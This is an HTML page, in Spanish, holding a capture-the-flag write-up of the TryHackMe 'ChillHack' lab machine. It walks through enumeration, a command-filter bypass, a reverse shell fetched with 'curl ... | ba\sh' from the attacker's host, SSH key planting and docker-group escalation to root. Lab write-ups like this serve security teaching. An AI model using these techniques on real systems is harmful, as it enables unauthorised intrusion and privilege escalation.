@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <head>
+    <!-- Include Meta Tags Here -->
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1 user-scalable=no, shrink-to-fit=no">
+<meta content='#000000' name='theme-color'/>
+<meta name="keywords" content="Site, Template, Theme">
+<title>CyberWiki | ChillHack</title>
+
+<!-- Open Graph general (Facebook, Pinterest & Google+) -->
+<meta name="og:title" content="CyberWiki | ChillHack">
+<meta name="og:description" content="Easy level CTF. Capture the flags and have fun!">
+<meta name="og:image" content="../assets/images/Rooms/ChillHack/chillhack.png">
+<meta name="og:image:alt" content="CyberWiki | ChillHack">
+<meta name="og:url" content="http://localhost:4000/blog/ChillHack">
+<meta name="article:author" content="https://www.facebook.com/">
+<meta name="og:site_name" content="CyberWiki | ChillHack">
+<meta name="og:type" content="website">
+<!-- Twitter -->
+<meta property="twitter:card" content="summary_large_image"/>
+<meta name="twitter:title" content="CyberWiki | ChillHack">
+<meta name="twitter:description" content="Easy level CTF. Capture the flags and have fun!">
+<meta name="twitter:site" content="@">
+<meta name="twitter:creator" content="@">
+<meta name="twitter:image:src" content="../assets/images/Rooms/ChillHack/chillhack.png">
+<!-- Search Engine -->
+<meta name="description" content="Easy level CTF. Capture the flags and have fun!">
+<meta name="image" content="../assets/images/Rooms/ChillHack/chillhack.png">
+<!-- Schema.org for Google -->
+<meta itemprop="name" content="CyberWiki | ChillHack">
+<meta name="author" content="Jose Luis Venega"/>
+<meta itemprop="description" content="Easy level CTF. Capture the flags and have fun!">
+<meta itemprop="image" content="../assets/images/Rooms/ChillHack/chillhack.png">
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+    gtag('js', new Date());
+
+    gtag('config', '');
+</script>
+    <title>CyberWiki</title>
+    <link rel="stylesheet" href="/assets/css/style.css">
+      <!-- Incluye el CSS de Prism.js -->
+    <link rel="stylesheet" href="../prism.css">
+    <script src="https://kit.fontawesome.com/6a97161b76.js" crossorigin="anonymous"></script>
+    <link rel="shortcut icon" href="/assets/images/favicon.png" type="image/x-icon">
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            var titleElement = document.getElementById('page-title');
+            var icon = "/assest/images/favicon.png"; // Puedes usar cualquier emoji o icono aquí
+            titleElement.textContent = icon + " " + titleElement.textContent;
+        });
+    </script>
+</head>
+</head>
+
+<body>
+  <nav class="navbar is-black is-fixed-top is-rounded" role="navigation" aria-label="main navigation" id="navbar">
+    <div class="container">
+
+        <!-- logo or branding image on left side -->
+       
+        <!-- Logo o imagen de marca en el lado izquierdo -->
+        <div class="navbar-brand">
+            <a class="navbar-item"
+            href="http://localhost:4000/">
+            <img src="/assets/images/favicon.png" alt="Site Icon" style="width: 24px; height: 24px; vertical-align: middle;">
+                <i class="/assest/images/favicon.png"></i> <!-- Icono  -->
+                <strong>CyberWiki</strong>
+            </a>
+            <div class="navbar-burger" data-target="navbar-menu">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+
+        <!-- children of navbar-menu must be navbar-start and/or navbar-end -->
+        <div class="navbar-menu has-background-black" id="navbar-menu">
+            <!-- navbar items | left side -->
+            <!-- <div class="navbar-start">
+            </div> -->
+            <!-- navbar items | right side -->
+            <div class="navbar-end">
+                <a class="navbar-item "
+                    href="http://localhost:4000/">HOME</a>
+                <a class="navbar-item" href="http://localhost:4000/#about">ABOUT</a>
+                <a class="navbar-item" href="http://localhost:4000/#contact">CONTACT</a>
+                <a class="navbar-item "
+                    href="http://localhost:4000/blog">WRITE-UPs</a>
+                <a class="navbar-item "
+                    href="http://localhost:4000/project">LABS</a>
+                <!-- <div class="navbar-item has-dropdown is-hoverable">
+    <a class="navbar-link">
+        MORE
+    </a>
+    <div class="navbar-dropdown has-background-black is-left">
+        
+        
+        
+        
+        
+        
+        
+        
+        <a href="http://localhost:4000/project"
+            class="navbar-item has-text-grey-light ">
+            Projects
+        </a>
+        
+        
+        
+        <a href="http://localhost:4000/test-page"
+            class="navbar-item has-text-grey-light ">
+            Test Page
+        </a>
+        
+         -->
+        <!-- <hr class="navbar-divider">
+    <a class="navbar-item">
+      Report an issue
+    </a> -->
+    <!-- </div>
+</div> -->
+            </div>
+        </div>
+    </div>
+</nav>
+<!-- Bulma Navbar JS -->
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        /* Get all "navbar-burger" elements */
+        var $navbarBurgers = Array.prototype.slice.call(document.querySelectorAll('.navbar-burger'), 0);
+        /* Check if there are any navbar burgers */
+        if ($navbarBurgers.length > 0) {
+            /* Add a click event on each of them */
+            $navbarBurgers.forEach(function ($el) {
+                $el.addEventListener('click', function () {
+                    /* Get the target from the "data-target" attribute */
+                    var target = $el.dataset.target;
+                    var $target = document.getElementById(target);
+                    /* Toggle the class on both the "navbar-burger" and the "navbar-menu" */
+                    $el.classList.toggle('is-active');
+                    $target.classList.toggle('is-active');
+                });
+            });
+        }
+    });
+</script>
+  <section class="hero is-fullheight has-text-centered" id="post">
+    <div class="hero-body">
+      <div class="container">
+        <a href="/blog/ChillHack" class="has-text-black" id="title">
+          <h1 class="title has-text-centered is-2 has-text-weight-semibold ">ChillHack</h1>
+        </a>
+        <hr class="has-background-black">
+        <div class="columns is-variable is-5 has-text-centered">
+          <div class="column is-6">
+            <div style="text-align: center; ">
+              <img src="../assets/images/Rooms/ChillHack/chillhack.png" alt="ChillHack" id="post-image">
+            </div>
+          </div>
+          <div class="subtitle column is-5 has-text-left-desktop has-text-left-fullhd has-text-left-tablet has-text-center-mobile" style="text-align: left;" ">
+            
+            <p id="description" class="content is-small has-text-weight-medium is-uppercase">
+              Easy level CTF. Capture the flags and have fun!
+              <!-- Enlace añadido aquí -->
+              <p class="subtitle is-uppercase is-6 has-text-weight-normal has-text-black-ter">Enlace de la room: 
+                <b><a href="https://tryhackme.com/r/room/chillhack" target="page.enlace">ChillHack</a></b>
+              </p>
+                
+              <p class="subtitle is-6 is-uppercase has-text-weight-normal has-text-black-ter">Dificultad de la room: 
+                <b>Fácil</b>
+              </p>
+            <p class="subtitle is-6 is-uppercase has-text-weight-normal has-text-black-ter">Publicado en
+              <b>August 21, 2024</b> by <a href="https://github.com/Joseeelv" target="_blank"><b class="has-text-link"><u>Jose Luis Venega</u></b>
+              </a>
+            </p><p class="subtitle is-uppercase">
+              <i class="fas fa-tags"></i>
+              
+              
+              <span class="tag is-link">Enumeración</span>
+              
+              
+              <span class="tag is-link">Web</span>
+              
+              
+              <span class="tag is-link">Reverse shell</span>
+              
+              
+              <span class="tag is-link">Privilege Escalation</span>
+              
+              
+            </p><!-- <p class="subtitle is-uppercase"><i class="fas fa-clock"></i> <b class="has-text-link">
+                7 min
+              </b>READ</p> --></div>
+        </div>
+        <div class="content has-text-justified-desktop has-text-justified-fullhd has-text-justified has-text-justified-tablet has-text-left-mobile">
+          <p><p>Primero de todo, vamos a realizar un escaneo de los puertos de la dirección ip de la máquina víctima:</p>
+<div style="text-align: left;">
+  <table>
+    <tr>
+      <td style="vertical-align: top;">
+        <div style="text-align: center;">
+          <img src="../assets/images/Rooms/ChillHack/image.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:650px;" />
+        </div>
+      </td>
+      <td style="vertical-align: top;">
+        <div style="text-align: center;">
+          <img src="../assets/images/Rooms/ChillHack/image 1.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:910px;" />
+        </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+<div style="text-align: center;">
+  <img src="../assets/images/Rooms/ChillHack/image 2.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+<p>Vemos que tiene abierto los puertos <strong>21</strong> (conexión servicio FTP), <strong>22</strong> (conexión servicio SSH) y <strong>80</strong> (página web no encriptada “http”).</p>
+
+<p>Primero, vamos a iniciar una conexión anónima en el servidor <em>FTP</em>, debido a que permite dicho tipos de conexiones:</p>
+<div style="text-align: center;">
+  <img src="../assets/images/Rooms/ChillHack/image 3.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+<p>Vemos que al iniciar sesión, y realizar un listado de los archivos encontramos un fichero <strong>note.txt</strong> que podemos descargar en nuestra máquina mediante el comando <code class="language-plaintext highlighter-rouge">get</code>.</p>
+<div style="text-align: center;">
+  <img src="../assets/images/Rooms/ChillHack/image 4.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+<p>Vemos que el fichero contiene dos usuarios <strong>Anurodh</strong> y <strong>Apaar</strong>.</p>
+
+<p>Como aquí no podemos seguir haciendo nada, vamos a ver que encontramos la página web:</p>
+<div style="text-align: center;">
+  <img src="../assets/images/Rooms/ChillHack/image 5.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+
+<p>Como de costumbre, no encontramos nada a simple vista, por lo que vamos a realizar <em>fuzzing web</em> con <code class="language-plaintext highlighter-rouge">gobuster</code>:</p>
+<div style="text-align: center;">
+  <img src="../assets/images/Rooms/ChillHack/image 6.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+
+<p>Encontramos un directorio oculto, llamado <code class="language-plaintext highlighter-rouge">/secret</code> que si accedemos a él encontramos un campo donde podemos ejecutar código, por lo que estamos ante un <em>RCE</em>:</p>
+<div style="text-align: center;">
+  <img src="../assets/images/Rooms/ChillHack/image 7.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+<p>Si ejecutamos un comando más interesante como puede ser <code class="language-plaintext highlighter-rouge">cat /etc/passwd</code> obtenemos como resultado:</p>
+<div style="text-align: center;">
+  <img src="../assets/images/Rooms/ChillHack/image 8.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+<p>Podemos interceptar la petición del CRE mediante <em>burpsuite</em>, donde podemos enviar los comandos pero intentando bypassear la “protección”, por ejemplo:</p>
+<div style="text-align: center;">
+  <img src="../assets/images/Rooms/ChillHack/image 9.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+<p>Hemos hecho un bypass del comando <code class="language-plaintext highlighter-rouge">ls -la</code> escapando la s, por lo que podemos llevarlo a la práctica con otros comandos:</p>
+
+<table>
+  <tr>
+    <td style="vertical-align:top">
+      <div style="text-align: center;">
+      <img src="../assets/images/Rooms/ChillHack/image 10_1.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+      </div>
+    </td>
+    <td style="vertical-align:top;">
+      <div style="text-align:center;">
+        <img src="../assets/images/Rooms/ChillHack/image 10_2.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+      </div>
+    </td>
+  </tr>
+</table>
+
+<p>Vemos que si escapamos el comando <code class="language-plaintext highlighter-rouge">cat /index.php</code> encontramos los comandos que no se pueden ejecutar de manera normal.
+Por lo que, podemos intentar ejecutar una <em>reverse shell</em> desde la página web:</p>
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 12.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+
+<p>Ahora, en la web vamos a ejecutar el comando:</p>
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      Bash
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-bash">curl http://ip_nuestra/nombre_shell | ba\sh</code></pre>
+  </div>
+</div>
+
+<p>para poder obtener la <em>reverse shell</em> y seguido ejecutarla escapando el comando <code class="language-plaintext highlighter-rouge">bash</code>.</p>
+
+<table style="text-align:center">
+  <tr>
+    <td style="vertical-align:top;">
+      <div>
+        <img src="../assets/images/Rooms/ChillHack/image 13.png" alt="Untitled" onclick="openModal(this.src)" />
+      </div>
+      Como resultado, tenemos que al escuchar y ejecutar la shell, estamos dentro del servidor.
+    </td>
+    <td style="vertical-align:top;">
+      <div>
+        <img src="../assets/images/Rooms/ChillHack/image 14.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:300px" />
+      </div>
+    </td>
+  </tr>
+</table>
+
+<p>Ahora dentro, podemos intentar escalar privilegios. Por lo que podemos hacer uso del comando -&gt; <code class="language-plaintext highlighter-rouge">sudo -l</code> para obtener los comandos que puede ejecutar como root el usuario <em>www-data</em>.</p>
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 15.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+<p>En efecto, vemos que el comando <code class="language-plaintext highlighter-rouge">/home/apaaar/.helpline.sh</code> pueden ejecutarlos todos los usuarios del sistema.
+Como es un script escrito en <strong>bash</strong> podemos ver su contenido:</p>
+
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 16.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:700px" />
+</div>
+
+<p>Si ejecutamos el comando especificando el usuario <code class="language-plaintext highlighter-rouge">-u apaar</code> y en el mensaje escribimos <code class="language-plaintext highlighter-rouge">/bin/bash</code> (ejecución de una terminal), esta se ejecutará como <strong>apaar</strong> (ya que hemos especificado su usuario).</p>
+
+<table style="text-align:left">
+  <tr>
+    <td style="vertical-align:top; width:50%">
+      Y vemos que lo que realiza es una interacción, donde nos pide un nombre y un mensaje.
+      <div style="text-align:center;">
+        <img src="../assets/images/Rooms/ChillHack/image 17.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+      </div>
+    </td>
+    <td style="vertical-align:top; width:50% ">
+      Tratamiento de la tty (para poder tener una CLI más amigable):
+    <div style="text-align:left;">
+      <div class="code-container">
+          <div class="code-header">
+            Bash
+            <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+          </div>
+          <pre><code class="language-bash">python3 -c 'import pty; pty.spawn("/bin/bash)'
+(ctrl + Z)
+stty raw -echo;fg
+stty rows 29 columns 126
+export TERM=screen</code></pre>
+        </div>
+      </div>
+  </td>
+  </tr>
+</table>
+
+<p>Procedemos a buscar la flag y la tenemos.</p>
+
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 18.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+
+<p>Ahora, para seguir continuando con el CTF, vamos a realizar una escalada de privilegios pero ahora a root, para poder conseguir así la última flag.
+Podemos realizar una búsqueda de binarios (spoiler, no va a servir de nada).</p>
+
+<p>Ya que estamos dentro del servidor podemos echarle un ojo a los puertos que tiene abierto y vemos que tiene en escucha uno muy raro -&gt; <code class="language-plaintext highlighter-rouge">127.0.0.1:9001</code>.</p>
+
+<table style="text-align:left">
+  <tr>
+    <td style="vertical-align:top; width:50%">
+      <div style="text-align:center;">
+        <img src="../assets/images/Rooms/ChillHack/image 19.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+      </div>
+Encontramos un panel de login, que puede cuadrar con el servicio *SSH* que hay corriendo por el puerto 22, por lo que podemos buscar el <strong>id_rsa</strong> del usuario <strong>apaar</strong> para poder iniciar sesión.
+    </td>
+    <td style="vertical-align:top; width:50% ">
+      <div style="text-align:center;">
+        <img src="../assets/images/Rooms/ChillHack/image 23.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px" />
+      </div>
+    </td>
+  </tr>
+</table>
+
+<p>Pero primero, vamos a volver a hacer <em>fuzzing web</em> a esta web:</p>
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      Bash
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-bash">gobuster dir -u ip_maquina:9001 -w /ruta_wordlist</code></pre>
+  </div>
+</div>
+<p>y vemos que tenemos un directorio llamado <code class="language-plaintext highlighter-rouge">/images</code>, si accedemos a él encontramos dos archivos, el que nos interesa es el ‘.jpg’.</p>
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 28.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+
+<p>Ahora nos descargamos el archivo:</p>
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      Bash
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-bash">wget hacker-with-laptop_23-2147985341.jpg</code></pre>
+  </div>
+</div>
+<p>Como tenemos una imagen con extensión ‘.jpg’ podemos hacer uso de <code class="language-plaintext highlighter-rouge">steghide</code> para poder encontrar información oculta en la imagen:</p>
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 29.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+<p>Y esto no da un archivo llamado ‘backup.zip’, el cual si queremos descomprimir nos pedirá una contraseña, la cual podemos intentar romper con un ataque de fuerza bruta, con <code class="language-plaintext highlighter-rouge">fcrackzip</code>:</p>
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 30.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+
+<p>Tenemos la contraseña del ‘.zip’, vamos a abrirlo:</p>
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      Bash
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-bash">unzip backup.zip
+nano source_code.php</code></pre>
+  </div>
+</div>
+
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 31.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+
+<p>Encontramos la contraseña del otro usuario <strong>Anurodh</strong>, la cual está encriptada en base64, la desencriptamos y nos la guardamos:</p>
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      Bash
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-bash">echo -e "contraseña_base64" | base64 -d</code></pre>
+  </div>
+</div>
+
+<p>Ahora sí, vamos a proceder a obtener las claves <em>id_rsa</em> del usuario <strong>apaar</strong>, para ello vamos al directorio donde estas se almacenan:</p>
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      Bash
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-bash">cd /home/apaar/.shh</code></pre>
+  </div>
+</div>
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 20.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+
+<p>Vemos que no tenemos el <strong>id_rsa</strong> como tal, si no que tenemos un fichero llamado ‘authorized_key’ que son las claves permitidas y autorizadas para poder realizar la conexión vía <em>SSH</em>.
+Pero nosotros podemos crear una clave e introducirla en dicho fichero ya que tenemos permisos de escritura en el mismo.</p>
+
+<p>Con <code class="language-plaintext highlighter-rouge">ssh-keygen</code> podemos crear una clave para el usuario <strong>apaar</strong> y tenemos tanto el <strong>id_rsa</strong> (apaar) como el <strong>id_rsa.pub</strong> (apaar.pub).</p>
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 21.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:500px" />
+</div>
+
+<p>A continuación, guardamos <em>apaar.pub</em> en el fichero ‘authorized_keys’ y apaar en un archivo <em>id_rsa</em> en nuestra máquina y podremos realizar nuestro inicio de sesión vía <em>SSH</em>.</p>
+
+<table style="text-align:left">
+  <tr>
+    <td style="vertical-align:top; width:45%">
+      <div style="text-align:center;">
+        <img src="../assets/images/Rooms/ChillHack/image 22.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+      </div>
+    </td>
+    <td style="vertical-align:top; width:50% ">
+    Ahora que estamos dentro y previamente obtuvimos la contraseña del usuario <strong>Anurodh</strong>, mediante el comando <code>su Anurodh</code> y su contraseña nos convertiremos en dicho usuario:
+      <div style="text-align:center;">
+        <img src="../assets/images/Rooms/ChillHack/image 33.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px" />
+      </div>
+      <div style="text-align:center;">
+        <img src="../assets/images/Rooms/ChillHack/image 34.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px" />
+      </div>
+      Con el comando <code>id</code> vemos información acerca del usuario actual y vemos que pertenece al grupo <strong>docker</strong>, es decir, tiene permisos para poder ejecutar comandos Docker y puede acceder al <em>daemon</em> Docker.
+    </td>
+  </tr>
+</table>
+
+<p>Podemos buscar en <a href="https://gtfobins.github.io/gtfobins/docker/#shell">GTFObins/Docker</a> un exploit para escalar privilegios y en efecto, hemos escalado privilegios, ergo somos usuarios root.</p>
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/ChillHack/image 35.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px" />
+</div>
+<p>Hemos obtenido la root flag, por lo que hemos terminado el CTF.</p>
+
+<hr />
+</p>
+        </div>
+        
+        <div class="disqus-comments" id="disqus_thread"></div>
+        
+      </div>
+    </div>
+  </section>
+  <footer id="footer">
+    <!--Footer Button-->
+    <div class="container has-text-centered has-background-grey-darker" id="backtotop">
+        <a class="has-text-white" onclick="window.scroll(0,0)">BACK TO TOP</a>
+    </div>
+    <!--Footer Main Section-->
+    <div class="has-background-grey-darker">
+        <div class="container columns">
+            <!--Name Section-->
+            <div class="column has-text-left-desktop has-text-centered-mobile">
+                <a href="http://localhost:4000/#about">
+                    <div class="columns">
+                        <div class="column is-one-fifth-desktop is-one-fifth-fullhd is-one-quarter-tablet">
+                            <figure class="image is-64x64">
+                                <img class="is-rounded" src="/assets/images/me.png">
+                            </figure>
+                        </div>
+                        <div class="column is-marginless">
+                            <h5 class="has-text-grey-lighter">Jose Luis Venega</h5>
+                            <div class="content has-text-grey">
+                                <p>Hello, I am Jose Luis Venega Sánchez, a student of Computer Engineering ...</p>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </div>
+
+            <!--Link Section-->
+            <div class="column has-text-white">
+                <h3>More Links</h3>
+                
+                
+                <!-- <li>
+                    <a href="http://localhost:4000/test-page">Test Page</a>
+                </li> -->
+                
+                
+                <li>
+                    <a target="_blank" href="http://localhost:4000/feed.xml">Subscribe via RSS</a>
+                </li>
+            </div>
+
+            <!--Blog-post Section-->
+            <div class="column has-text-white">
+                <h3>Recent Posts</h3>
+                
+                <li>
+                    <a href="http://localhost:4000/blog/ChillHack">ChillHack</a>
+                </li>
+                
+                <li>
+                    <a href="http://localhost:4000/blog/DNS">Sistema de Nombres de Dominio "DNS"</a>
+                </li>
+                
+                <li>
+                    <a href="http://localhost:4000/blog/Startup">Start-up</a>
+                </li>
+                
+            </div>
+        </div>
+    </div>
+    <!-- <div class="has-background-black has-text-centered has-text-white" id="credits">
+        <i class="far fa-copyright"></i> 2024 | <a href="https://github.com/thedevslot/WhatATheme" target="_blank" rel="noopener noreferrer">WhatATheme</a> - A Theme made with <i class="fas fa-heart has-text-danger"></i> by <a href="https://www.twitter.com/thedevslot" target="_blank" rel="noopener noreferrer">TheDevsLot</a> Powered by <a href="https://jekyllrb.com/" target="_blank">Jekyll</a>
+    </div> -->
+</footer>
+
+  <!-- Modal -->
+  <div id="myModal" class="modal">
+    <span class="close" onclick="closeModal()">&times;</span>
+    <img class="modal-content" id="img01">
+  </div>
+ <!-- Prism.js Script -->
+
+  <script src="../prism.js"></script>
+  <script>
+    function copyToClipboard(button) {
+    const codeBlock = button.closest('.code-container').querySelector('code');
+    navigator.clipboard.writeText(codeBlock.textContent).then(() => {
+        button.textContent = 'Copiado';
+        setTimeout(() => {
+            button.textContent = 'Copiar';
+        }, 2000);
+    }).catch(err => {
+        console.error('Error al copiar el texto: ', err);
+    });
+}
+
+     function openModal(imgSrc) {
+      var modal = document.getElementById("myModal");
+      var modalImg = document.getElementById("img01");
+
+      modal.style.display = "block";
+      setTimeout(function() {
+        modal.classList.add('show');
+      }, 10); // Delay to trigger the animation
+      modalImg.src = imgSrc;
+    }
+
+    function closeModal(event) {
+      if (event) event.stopPropagation(); // Prevents closing when clicking the close button
+      var modal = document.getElementById("myModal");
+      modal.classList.remove('show');
+      setTimeout(function() {
+        modal.style.display = "none";
+      }, 300); // Match this duration with the CSS animation duration
+    }
+
+    // Close modal when clicking outside the content
+    window.onclick = function(event) {
+      var modal = document.getElementById("myModal");
+      if (event.target == modal) {
+        closeModal();
+      }
+    }
+  </script>
+</body>
+</html>
